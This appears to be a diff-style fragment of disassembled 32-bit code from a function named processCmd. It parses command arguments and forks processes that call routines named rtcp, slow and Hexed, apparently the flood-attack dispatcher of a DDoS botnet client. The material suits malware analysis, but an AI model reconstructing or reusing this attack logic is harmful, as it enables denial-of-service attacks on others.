+ 804d2d7: 83 7d 08 05                  	cmpl	$0x5, 0x8(%ebp)
+ 804d2db: 0f 8e e7 0e 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804d2e1: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d2e4: 83 c0 0c                     	addl	$0xc, %eax
+ 804d2e7: 8b 00                        	movl	(%eax), %eax
+ 804d2e9: 89 04 24                     	movl	%eax, (%esp)
+ 804d2ec: e8 eb 60 00 00               	calll	0x80533dc <atol>
+ 804d2f1: 3d 10 27 00 00               	cmpl	$0x2710, %eax           # imm = 0x2710
+ 804d2f6: 7e 05                        	jle	0x804d2fd <processCmd+0x150f>
+ 804d2f8: e9 cb 0e 00 00               	jmp	0x804e1c8 <processCmd+0x23da>
+ 804d2fd: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d300: 83 c0 04                     	addl	$0x4, %eax
+ 804d303: 8b 00                        	movl	(%eax), %eax
+ 804d305: 89 85 38 ff ff ff            	movl	%eax, -0xc8(%ebp)
+ 804d30b: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d30e: 83 c0 08                     	addl	$0x8, %eax
+ 804d311: 8b 00                        	movl	(%eax), %eax
+ 804d313: 89 04 24                     	movl	%eax, (%esp)
+ 804d316: e8 c1 60 00 00               	calll	0x80533dc <atol>
+ 804d31b: 89 85 3c ff ff ff            	movl	%eax, -0xc4(%ebp)
+ 804d321: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d324: 83 c0 0c                     	addl	$0xc, %eax
+ 804d327: 8b 00                        	movl	(%eax), %eax
+ 804d329: 89 04 24                     	movl	%eax, (%esp)
+ 804d32c: e8 ab 60 00 00               	calll	0x80533dc <atol>
+ 804d331: 89 85 40 ff ff ff            	movl	%eax, -0xc0(%ebp)
+ 804d337: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d33a: 83 c0 10                     	addl	$0x10, %eax
+ 804d33d: 8b 00                        	movl	(%eax), %eax
+ 804d33f: 89 04 24                     	movl	%eax, (%esp)
+ 804d342: e8 95 60 00 00               	calll	0x80533dc <atol>
+ 804d347: 89 85 44 ff ff ff            	movl	%eax, -0xbc(%ebp)
+ 804d34d: 83 7d 08 07                  	cmpl	$0x7, 0x8(%ebp)
+ 804d351: 75 18                        	jne	0x804d36b <processCmd+0x157d>
+ 804d353: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d356: 83 c0 18                     	addl	$0x18, %eax
+ 804d359: 8b 00                        	movl	(%eax), %eax
+ 804d35b: 89 04 24                     	movl	%eax, (%esp)
+ 804d35e: e8 79 60 00 00               	calll	0x80533dc <atol>
+ 804d363: 89 85 00 fe ff ff            	movl	%eax, -0x200(%ebp)
+ 804d369: eb 0a                        	jmp	0x804d375 <processCmd+0x1587>
+ 804d36b: c7 85 00 fe ff ff 0a 00 00 00	movl	$0xa, -0x200(%ebp)
+ 804d375: 8b b5 00 fe ff ff            	movl	-0x200(%ebp), %esi
+ 804d37b: 89 b5 48 ff ff ff            	movl	%esi, -0xb8(%ebp)
+ 804d381: 83 7d 08 05                  	cmpl	$0x5, 0x8(%ebp)
+ 804d385: 7e 18                        	jle	0x804d39f <processCmd+0x15b1>
+ 804d387: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d38a: 83 c0 14                     	addl	$0x14, %eax
+ 804d38d: 8b 00                        	movl	(%eax), %eax
+ 804d38f: 89 04 24                     	movl	%eax, (%esp)
+ 804d392: e8 45 60 00 00               	calll	0x80533dc <atol>
+ 804d397: 89 85 04 fe ff ff            	movl	%eax, -0x1fc(%ebp)
+ 804d39d: eb 0a                        	jmp	0x804d3a9 <processCmd+0x15bb>
+ 804d39f: c7 85 04 fe ff ff 00 00 00 00	movl	$0x0, -0x1fc(%ebp)
+ 804d3a9: 8b bd 04 fe ff ff            	movl	-0x1fc(%ebp), %edi
+ 804d3af: 89 bd 4c ff ff ff            	movl	%edi, -0xb4(%ebp)
+ 804d3b5: 8b 85 38 ff ff ff            	movl	-0xc8(%ebp), %eax
+ 804d3bb: c7 44 24 04 2c 00 00 00      	movl	$0x2c, 0x4(%esp)
+ 804d3c3: 89 04 24                     	movl	%eax, (%esp)
+ 804d3c6: e8 95 41 00 00               	calll	0x8051560 <strchr>
+ 804d3cb: 85 c0                        	testl	%eax, %eax
+ 804d3cd: 0f 84 98 00 00 00            	je	0x804d46b <processCmd+0x167d>
+ 804d3d3: 8b 85 38 ff ff ff            	movl	-0xc8(%ebp), %eax
+ 804d3d9: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804d3e1: 89 04 24                     	movl	%eax, (%esp)
+ 804d3e4: e8 cb 43 00 00               	calll	0x80517b4 <strtok>
+ 804d3e9: 89 85 50 ff ff ff            	movl	%eax, -0xb0(%ebp)
+ 804d3ef: eb 6f                        	jmp	0x804d460 <processCmd+0x1672>
+ 804d3f1: e8 5f c3 ff ff               	calll	0x8049755 <listFork>
+ 804d3f6: 85 c0                        	testl	%eax, %eax
+ 804d3f8: 75 4c                        	jne	0x804d446 <processCmd+0x1658>
+ 804d3fa: 8b 85 48 ff ff ff            	movl	-0xb8(%ebp), %eax
+ 804d400: 89 44 24 14                  	movl	%eax, 0x14(%esp)
+ 804d404: 8b 85 4c ff ff ff            	movl	-0xb4(%ebp), %eax
+ 804d40a: 89 44 24 10                  	movl	%eax, 0x10(%esp)
+ 804d40e: 8b 85 44 ff ff ff            	movl	-0xbc(%ebp), %eax
+ 804d414: 89 44 24 0c                  	movl	%eax, 0xc(%esp)
+ 804d418: 8b 85 40 ff ff ff            	movl	-0xc0(%ebp), %eax
+ 804d41e: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804d422: 8b 85 3c ff ff ff            	movl	-0xc4(%ebp), %eax
+ 804d428: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804d42c: 8b 85 50 ff ff ff            	movl	-0xb0(%ebp), %eax
+ 804d432: 89 04 24                     	movl	%eax, (%esp)
+ 804d435: e8 62 d0 ff ff               	calll	0x804a49c <rtcp>
+ 804d43a: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804d441: e8 72 2d 00 00               	calll	0x80501b8 <_exit>
+ 804d446: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804d44e: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804d455: e8 5a 43 00 00               	calll	0x80517b4 <strtok>
+ 804d45a: 89 85 50 ff ff ff            	movl	%eax, -0xb0(%ebp)
+ 804d460: 83 bd 50 ff ff ff 00         	cmpl	$0x0, -0xb0(%ebp)
+ 804d467: 75 88                        	jne	0x804d3f1 <processCmd+0x1603>
+ 804d469: eb 59                        	jmp	0x804d4c4 <processCmd+0x16d6>
+ 804d46b: e8 e5 c2 ff ff               	calll	0x8049755 <listFork>
+ 804d470: 85 c0                        	testl	%eax, %eax
+ 804d472: 0f 85 50 0d 00 00            	jne	0x804e1c8 <processCmd+0x23da>
+ 804d478: 8b 85 48 ff ff ff            	movl	-0xb8(%ebp), %eax
+ 804d47e: 89 44 24 14                  	movl	%eax, 0x14(%esp)
+ 804d482: 8b 85 4c ff ff ff            	movl	-0xb4(%ebp), %eax
+ 804d488: 89 44 24 10                  	movl	%eax, 0x10(%esp)
+ 804d48c: 8b 85 44 ff ff ff            	movl	-0xbc(%ebp), %eax
+ 804d492: 89 44 24 0c                  	movl	%eax, 0xc(%esp)
+ 804d496: 8b 85 40 ff ff ff            	movl	-0xc0(%ebp), %eax
+ 804d49c: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804d4a0: 8b 85 3c ff ff ff            	movl	-0xc4(%ebp), %eax
+ 804d4a6: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804d4aa: 8b 85 38 ff ff ff            	movl	-0xc8(%ebp), %eax
+ 804d4b0: 89 04 24                     	movl	%eax, (%esp)
+ 804d4b3: e8 e4 cf ff ff               	calll	0x804a49c <rtcp>
+ 804d4b8: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804d4bf: e8 f4 2c 00 00               	calll	0x80501b8 <_exit>
+ 804d4c4: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d4c7: 8b 00                        	movl	(%eax), %eax
+ 804d4c9: 89 85 64 fd ff ff            	movl	%eax, -0x29c(%ebp)
+ 804d4cf: c7 85 60 fd ff ff 2a 8e 05 08	movl	$0x8058e2a, -0x2a0(%ebp) # imm = 0x8058E2A
+ 804d4d9: c7 85 5c fd ff ff 05 00 00 00	movl	$0x5, -0x2a4(%ebp)
+ 804d4e3: fc                           	cld
+ 804d4e4: 8b b5 64 fd ff ff            	movl	-0x29c(%ebp), %esi
+ 804d4ea: 8b bd 60 fd ff ff            	movl	-0x2a0(%ebp), %edi
+ 804d4f0: 8b 8d 5c fd ff ff            	movl	-0x2a4(%ebp), %ecx
+ 804d4f6: f3 a6                        	rep		cmpsb	%es:(%edi), (%esi)
+ 804d4f8: 0f 97 c2                     	seta	%dl
+ 804d4fb: 0f 92 c0                     	setb	%al
+ 804d4fe: 88 d1                        	movb	%dl, %cl
+ 804d500: 28 c1                        	subb	%al, %cl
+ 804d502: 88 c8                        	movb	%cl, %al
+ 804d504: 0f be c0                     	movsbl	%al, %eax
+ 804d507: 85 c0                        	testl	%eax, %eax
+ 804d509: 0f 85 44 01 00 00            	jne	0x804d653 <processCmd+0x1865>
+ 804d50f: 83 7d 08 03                  	cmpl	$0x3, 0x8(%ebp)
+ 804d513: 0f 8e af 0c 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804d519: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d51c: 83 c0 08                     	addl	$0x8, %eax
+ 804d51f: 8b 00                        	movl	(%eax), %eax
+ 804d521: 89 04 24                     	movl	%eax, (%esp)
+ 804d524: e8 b3 5e 00 00               	calll	0x80533dc <atol>
+ 804d529: 85 c0                        	testl	%eax, %eax
+ 804d52b: 0f 8e 97 0c 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804d531: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d534: 83 c0 0c                     	addl	$0xc, %eax
+ 804d537: 8b 00                        	movl	(%eax), %eax
+ 804d539: 89 04 24                     	movl	%eax, (%esp)
+ 804d53c: e8 9b 5e 00 00               	calll	0x80533dc <atol>
+ 804d541: 85 c0                        	testl	%eax, %eax
+ 804d543: 7f 05                        	jg	0x804d54a <processCmd+0x175c>
+ 804d545: e9 7e 0c 00 00               	jmp	0x804e1c8 <processCmd+0x23da>
+ 804d54a: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d54d: 83 c0 04                     	addl	$0x4, %eax
+ 804d550: 8b 00                        	movl	(%eax), %eax
+ 804d552: 89 85 54 ff ff ff            	movl	%eax, -0xac(%ebp)
+ 804d558: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d55b: 83 c0 08                     	addl	$0x8, %eax
+ 804d55e: 8b 00                        	movl	(%eax), %eax
+ 804d560: 89 04 24                     	movl	%eax, (%esp)
+ 804d563: e8 74 5e 00 00               	calll	0x80533dc <atol>
+ 804d568: 89 85 58 ff ff ff            	movl	%eax, -0xa8(%ebp)
+ 804d56e: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d571: 83 c0 0c                     	addl	$0xc, %eax
+ 804d574: 8b 00                        	movl	(%eax), %eax
+ 804d576: 89 04 24                     	movl	%eax, (%esp)
+ 804d579: e8 5e 5e 00 00               	calll	0x80533dc <atol>
+ 804d57e: 89 85 5c ff ff ff            	movl	%eax, -0xa4(%ebp)
+ 804d584: 8b 85 54 ff ff ff            	movl	-0xac(%ebp), %eax
+ 804d58a: c7 44 24 04 2c 00 00 00      	movl	$0x2c, 0x4(%esp)
+ 804d592: 89 04 24                     	movl	%eax, (%esp)
+ 804d595: e8 c6 3f 00 00               	calll	0x8051560 <strchr>
+ 804d59a: 85 c0                        	testl	%eax, %eax
+ 804d59c: 74 7a                        	je	0x804d618 <processCmd+0x182a>
+ 804d59e: 8b 85 54 ff ff ff            	movl	-0xac(%ebp), %eax
+ 804d5a4: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804d5ac: 89 04 24                     	movl	%eax, (%esp)
+ 804d5af: e8 00 42 00 00               	calll	0x80517b4 <strtok>
+ 804d5b4: 89 85 60 ff ff ff            	movl	%eax, -0xa0(%ebp)
+ 804d5ba: eb 51                        	jmp	0x804d60d <processCmd+0x181f>
+ 804d5bc: e8 94 c1 ff ff               	calll	0x8049755 <listFork>
+ 804d5c1: 85 c0                        	testl	%eax, %eax
+ 804d5c3: 75 2e                        	jne	0x804d5f3 <processCmd+0x1805>
+ 804d5c5: 8b 85 5c ff ff ff            	movl	-0xa4(%ebp), %eax
+ 804d5cb: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804d5cf: 8b 85 58 ff ff ff            	movl	-0xa8(%ebp), %eax
+ 804d5d5: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804d5d9: 8b 85 60 ff ff ff            	movl	-0xa0(%ebp), %eax
+ 804d5df: 89 04 24                     	movl	%eax, (%esp)
+ 804d5e2: e8 3d d2 ff ff               	calll	0x804a824 <slow>
+ 804d5e7: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804d5ee: e8 c5 2b 00 00               	calll	0x80501b8 <_exit>
+ 804d5f3: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804d5fb: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804d602: e8 ad 41 00 00               	calll	0x80517b4 <strtok>
+ 804d607: 89 85 60 ff ff ff            	movl	%eax, -0xa0(%ebp)
+ 804d60d: 83 bd 60 ff ff ff 00         	cmpl	$0x0, -0xa0(%ebp)
+ 804d614: 75 a6                        	jne	0x804d5bc <processCmd+0x17ce>
+ 804d616: eb 3b                        	jmp	0x804d653 <processCmd+0x1865>
+ 804d618: e8 38 c1 ff ff               	calll	0x8049755 <listFork>
+ 804d61d: 85 c0                        	testl	%eax, %eax
+ 804d61f: 0f 85 a3 0b 00 00            	jne	0x804e1c8 <processCmd+0x23da>
+ 804d625: 8b 85 5c ff ff ff            	movl	-0xa4(%ebp), %eax
+ 804d62b: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804d62f: 8b 85 58 ff ff ff            	movl	-0xa8(%ebp), %eax
+ 804d635: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804d639: 8b 85 54 ff ff ff            	movl	-0xac(%ebp), %eax
+ 804d63f: 89 04 24                     	movl	%eax, (%esp)
+ 804d642: e8 dd d1 ff ff               	calll	0x804a824 <slow>
+ 804d647: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804d64e: e8 65 2b 00 00               	calll	0x80501b8 <_exit>
+ 804d653: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d656: 8b 00                        	movl	(%eax), %eax
+ 804d658: 89 85 58 fd ff ff            	movl	%eax, -0x2a8(%ebp)
+ 804d65e: c7 85 54 fd ff ff 2f 8e 05 08	movl	$0x8058e2f, -0x2ac(%ebp) # imm = 0x8058E2F
+ 804d668: c7 85 50 fd ff ff 06 00 00 00	movl	$0x6, -0x2b0(%ebp)
+ 804d672: fc                           	cld
+ 804d673: 8b b5 58 fd ff ff            	movl	-0x2a8(%ebp), %esi
+ 804d679: 8b bd 54 fd ff ff            	movl	-0x2ac(%ebp), %edi
+ 804d67f: 8b 8d 50 fd ff ff            	movl	-0x2b0(%ebp), %ecx
+ 804d685: f3 a6                        	rep		cmpsb	%es:(%edi), (%esi)
+ 804d687: 0f 97 c2                     	seta	%dl
+ 804d68a: 0f 92 c0                     	setb	%al
+ 804d68d: 88 d1                        	movb	%dl, %cl
+ 804d68f: 28 c1                        	subb	%al, %cl
+ 804d691: 88 c8                        	movb	%cl, %al
+ 804d693: 0f be c0                     	movsbl	%al, %eax
+ 804d696: 85 c0                        	testl	%eax, %eax
+ 804d698: 0f 85 44 01 00 00            	jne	0x804d7e2 <processCmd+0x19f4>
+ 804d69e: 83 7d 08 03                  	cmpl	$0x3, 0x8(%ebp)
+ 804d6a2: 0f 8e 20 0b 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804d6a8: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d6ab: 83 c0 08                     	addl	$0x8, %eax
+ 804d6ae: 8b 00                        	movl	(%eax), %eax
+ 804d6b0: 89 04 24                     	movl	%eax, (%esp)
+ 804d6b3: e8 24 5d 00 00               	calll	0x80533dc <atol>
+ 804d6b8: 85 c0                        	testl	%eax, %eax
+ 804d6ba: 0f 8e 08 0b 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804d6c0: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d6c3: 83 c0 0c                     	addl	$0xc, %eax
+ 804d6c6: 8b 00                        	movl	(%eax), %eax
+ 804d6c8: 89 04 24                     	movl	%eax, (%esp)
+ 804d6cb: e8 0c 5d 00 00               	calll	0x80533dc <atol>
+ 804d6d0: 85 c0                        	testl	%eax, %eax
+ 804d6d2: 7f 05                        	jg	0x804d6d9 <processCmd+0x18eb>
+ 804d6d4: e9 ef 0a 00 00               	jmp	0x804e1c8 <processCmd+0x23da>
+ 804d6d9: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d6dc: 83 c0 04                     	addl	$0x4, %eax
+ 804d6df: 8b 00                        	movl	(%eax), %eax
+ 804d6e1: 89 85 64 ff ff ff            	movl	%eax, -0x9c(%ebp)
+ 804d6e7: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d6ea: 83 c0 08                     	addl	$0x8, %eax
+ 804d6ed: 8b 00                        	movl	(%eax), %eax
+ 804d6ef: 89 04 24                     	movl	%eax, (%esp)
+ 804d6f2: e8 e5 5c 00 00               	calll	0x80533dc <atol>
+ 804d6f7: 89 85 68 ff ff ff            	movl	%eax, -0x98(%ebp)
+ 804d6fd: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d700: 83 c0 0c                     	addl	$0xc, %eax
+ 804d703: 8b 00                        	movl	(%eax), %eax
+ 804d705: 89 04 24                     	movl	%eax, (%esp)
+ 804d708: e8 cf 5c 00 00               	calll	0x80533dc <atol>
+ 804d70d: 89 85 6c ff ff ff            	movl	%eax, -0x94(%ebp)
+ 804d713: 8b 85 64 ff ff ff            	movl	-0x9c(%ebp), %eax
+ 804d719: c7 44 24 04 2c 00 00 00      	movl	$0x2c, 0x4(%esp)
+ 804d721: 89 04 24                     	movl	%eax, (%esp)
+ 804d724: e8 37 3e 00 00               	calll	0x8051560 <strchr>
+ 804d729: 85 c0                        	testl	%eax, %eax
+ 804d72b: 74 7a                        	je	0x804d7a7 <processCmd+0x19b9>
+ 804d72d: 8b 85 64 ff ff ff            	movl	-0x9c(%ebp), %eax
+ 804d733: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804d73b: 89 04 24                     	movl	%eax, (%esp)
+ 804d73e: e8 71 40 00 00               	calll	0x80517b4 <strtok>
+ 804d743: 89 85 70 ff ff ff            	movl	%eax, -0x90(%ebp)
+ 804d749: eb 51                        	jmp	0x804d79c <processCmd+0x19ae>
+ 804d74b: e8 05 c0 ff ff               	calll	0x8049755 <listFork>
+ 804d750: 85 c0                        	testl	%eax, %eax
+ 804d752: 75 2e                        	jne	0x804d782 <processCmd+0x1994>
+ 804d754: 8b 85 6c ff ff ff            	movl	-0x94(%ebp), %eax
+ 804d75a: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804d75e: 8b 85 68 ff ff ff            	movl	-0x98(%ebp), %eax
+ 804d764: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804d768: 8b 85 70 ff ff ff            	movl	-0x90(%ebp), %eax
+ 804d76e: 89 04 24                     	movl	%eax, (%esp)
+ 804d771: e8 59 d7 ff ff               	calll	0x804aecf <Hexed>
+ 804d776: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804d77d: e8 36 2a 00 00               	calll	0x80501b8 <_exit>
+ 804d782: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804d78a: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804d791: e8 1e 40 00 00               	calll	0x80517b4 <strtok>
+ 804d796: 89 85 70 ff ff ff            	movl	%eax, -0x90(%ebp)
+ 804d79c: 83 bd 70 ff ff ff 00         	cmpl	$0x0, -0x90(%ebp)
+ 804d7a3: 75 a6                        	jne	0x804d74b <processCmd+0x195d>
+ 804d7a5: eb 3b                        	jmp	0x804d7e2 <processCmd+0x19f4>
+ 804d7a7: e8 a9 bf ff ff               	calll	0x8049755 <listFork>
+ 804d7ac: 85 c0                        	testl	%eax, %eax
+ 804d7ae: 0f 85 14 0a 00 00            	jne	0x804e1c8 <processCmd+0x23da>
+ 804d7b4: 8b 85 6c ff ff ff            	movl	-0x94(%ebp), %eax
+ 804d7ba: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804d7be: 8b 85 68 ff ff ff            	movl	-0x98(%ebp), %eax
+ 804d7c4: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804d7c8: 8b 85 64 ff ff ff            	movl	-0x9c(%ebp), %eax
+ 804d7ce: 89 04 24                     	movl	%eax, (%esp)
+ 804d7d1: e8 f9 d6 ff ff               	calll	0x804aecf <Hexed>
+ 804d7d6: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804d7dd: e8 d6 29 00 00               	calll	0x80501b8 <_exit>
+ 804d7e2: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d7e5: 8b 00                        	movl	(%eax), %eax
+ 804d7e7: 89 85 4c fd ff ff            	movl	%eax, -0x2b4(%ebp)
+ 804d7ed: c7 85 48 fd ff ff 35 8e 05 08	movl	$0x8058e35, -0x2b8(%ebp) # imm = 0x8058E35
+ 804d7f7: c7 85 44 fd ff ff 05 00 00 00	movl	$0x5, -0x2bc(%ebp)
+ 804d801: fc                           	cld
+ 804d802: 8b b5 4c fd ff ff            	movl	-0x2b4(%ebp), %esi
+ 804d808: 8b bd 48 fd ff ff            	movl	-0x2b8(%ebp), %edi
+ 804d80e: 8b 8d 44 fd ff ff            	movl	-0x2bc(%ebp), %ecx
+ 804d814: f3 a6                        	rep		cmpsb	%es:(%edi), (%esi)
+ 804d816: 0f 97 c2                     	seta	%dl
+ 804d819: 0f 92 c0                     	setb	%al
+ 804d81c: 88 d1                        	movb	%dl, %cl
+ 804d81e: 28 c1                        	subb	%al, %cl
+ 804d820: 88 c8                        	movb	%cl, %al
+ 804d822: 0f be c0                     	movsbl	%al, %eax
+ 804d825: 85 c0                        	testl	%eax, %eax
+ 804d827: 0f 85 66 01 00 00            	jne	0x804d993 <processCmd+0x1ba5>
+ 804d82d: 83 7d 08 03                  	cmpl	$0x3, 0x8(%ebp)
+ 804d831: 0f 8e 91 09 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804d837: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d83a: 83 c0 0c                     	addl	$0xc, %eax
+ 804d83d: 8b 00                        	movl	(%eax), %eax
+ 804d83f: 89 04 24                     	movl	%eax, (%esp)
+ 804d842: e8 95 5b 00 00               	calll	0x80533dc <atol>
+ 804d847: 3d 10 27 00 00               	cmpl	$0x2710, %eax           # imm = 0x2710
+ 804d84c: 7e 05                        	jle	0x804d853 <processCmd+0x1a65>
+ 804d84e: e9 75 09 00 00               	jmp	0x804e1c8 <processCmd+0x23da>
+ 804d853: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d856: 83 c0 04                     	addl	$0x4, %eax
+ 804d859: 8b 00                        	movl	(%eax), %eax
+ 804d85b: 89 85 74 ff ff ff            	movl	%eax, -0x8c(%ebp)
+ 804d861: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d864: 83 c0 08                     	addl	$0x8, %eax
+ 804d867: 8b 00                        	movl	(%eax), %eax
+ 804d869: 89 04 24                     	movl	%eax, (%esp)
+ 804d86c: e8 6b 5b 00 00               	calll	0x80533dc <atol>
+ 804d871: 89 85 78 ff ff ff            	movl	%eax, -0x88(%ebp)
+ 804d877: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d87a: 83 c0 0c                     	addl	$0xc, %eax
+ 804d87d: 8b 00                        	movl	(%eax), %eax
+ 804d87f: 89 04 24                     	movl	%eax, (%esp)
+ 804d882: e8 55 5b 00 00               	calll	0x80533dc <atol>
+ 804d887: 89 85 7c ff ff ff            	movl	%eax, -0x84(%ebp)
+ 804d88d: c7 45 80 20 00 00 00         	movl	$0x20, -0x80(%ebp)
+ 804d894: c7 45 84 0a 00 00 00         	movl	$0xa, -0x7c(%ebp)
+ 804d89b: c7 45 88 00 04 00 00         	movl	$0x400, -0x78(%ebp)     # imm = 0x400
+ 804d8a2: 8b 85 74 ff ff ff            	movl	-0x8c(%ebp), %eax
+ 804d8a8: c7 44 24 04 2c 00 00 00      	movl	$0x2c, 0x4(%esp)
+ 804d8b0: 89 04 24                     	movl	%eax, (%esp)
+ 804d8b3: e8 a8 3c 00 00               	calll	0x8051560 <strchr>
+ 804d8b8: 85 c0                        	testl	%eax, %eax
+ 804d8ba: 0f 84 83 00 00 00            	je	0x804d943 <processCmd+0x1b55>
+ 804d8c0: 8b 85 74 ff ff ff            	movl	-0x8c(%ebp), %eax
+ 804d8c6: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804d8ce: 89 04 24                     	movl	%eax, (%esp)
+ 804d8d1: e8 de 3e 00 00               	calll	0x80517b4 <strtok>
+ 804d8d6: 89 45 8c                     	movl	%eax, -0x74(%ebp)
+ 804d8d9: eb 60                        	jmp	0x804d93b <processCmd+0x1b4d>
+ 804d8db: e8 75 be ff ff               	calll	0x8049755 <listFork>
+ 804d8e0: 85 c0                        	testl	%eax, %eax
+ 804d8e2: 75 40                        	jne	0x804d924 <processCmd+0x1b36>
+ 804d8e4: 8b 45 84                     	movl	-0x7c(%ebp), %eax
+ 804d8e7: 89 44 24 14                  	movl	%eax, 0x14(%esp)
+ 804d8eb: 8b 45 88                     	movl	-0x78(%ebp), %eax
+ 804d8ee: 89 44 24 10                  	movl	%eax, 0x10(%esp)
+ 804d8f2: 8b 45 80                     	movl	-0x80(%ebp), %eax
+ 804d8f5: 89 44 24 0c                  	movl	%eax, 0xc(%esp)
+ 804d8f9: 8b 85 7c ff ff ff            	movl	-0x84(%ebp), %eax
+ 804d8ff: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804d903: 8b 85 78 ff ff ff            	movl	-0x88(%ebp), %eax
+ 804d909: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804d90d: 8b 45 8c                     	movl	-0x74(%ebp), %eax
+ 804d910: 89 04 24                     	movl	%eax, (%esp)
+ 804d913: e8 84 cb ff ff               	calll	0x804a49c <rtcp>
+ 804d918: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804d91f: e8 94 28 00 00               	calll	0x80501b8 <_exit>
+ 804d924: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804d92c: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804d933: e8 7c 3e 00 00               	calll	0x80517b4 <strtok>
+ 804d938: 89 45 8c                     	movl	%eax, -0x74(%ebp)
+ 804d93b: 83 7d 8c 00                  	cmpl	$0x0, -0x74(%ebp)
+ 804d93f: 75 9a                        	jne	0x804d8db <processCmd+0x1aed>
+ 804d941: eb 50                        	jmp	0x804d993 <processCmd+0x1ba5>
+ 804d943: e8 0d be ff ff               	calll	0x8049755 <listFork>
+ 804d948: 85 c0                        	testl	%eax, %eax
+ 804d94a: 0f 85 78 08 00 00            	jne	0x804e1c8 <processCmd+0x23da>
+ 804d950: 8b 45 84                     	movl	-0x7c(%ebp), %eax
+ 804d953: 89 44 24 14                  	movl	%eax, 0x14(%esp)
+ 804d957: 8b 45 88                     	movl	-0x78(%ebp), %eax
+ 804d95a: 89 44 24 10                  	movl	%eax, 0x10(%esp)
+ 804d95e: 8b 45 80                     	movl	-0x80(%ebp), %eax
+ 804d961: 89 44 24 0c                  	movl	%eax, 0xc(%esp)
+ 804d965: 8b 85 7c ff ff ff            	movl	-0x84(%ebp), %eax
+ 804d96b: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804d96f: 8b 85 78 ff ff ff            	movl	-0x88(%ebp), %eax
+ 804d975: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804d979: 8b 85 74 ff ff ff            	movl	-0x8c(%ebp), %eax
+ 804d97f: 89 04 24                     	movl	%eax, (%esp)
+ 804d982: e8 15 cb ff ff               	calll	0x804a49c <rtcp>
+ 804d987: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804d98e: e8 25 28 00 00               	calll	0x80501b8 <_exit>
+ 804d993: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d996: 8b 00                        	movl	(%eax), %eax
+ 804d998: 89 85 40 fd ff ff            	movl	%eax, -0x2c0(%ebp)
+ 804d99e: c7 85 3c fd ff ff 3a 8e 05 08	movl	$0x8058e3a, -0x2c4(%ebp) # imm = 0x8058E3A
+ 804d9a8: c7 85 38 fd ff ff 05 00 00 00	movl	$0x5, -0x2c8(%ebp)
+ 804d9b2: fc                           	cld
+ 804d9b3: 8b b5 40 fd ff ff            	movl	-0x2c0(%ebp), %esi
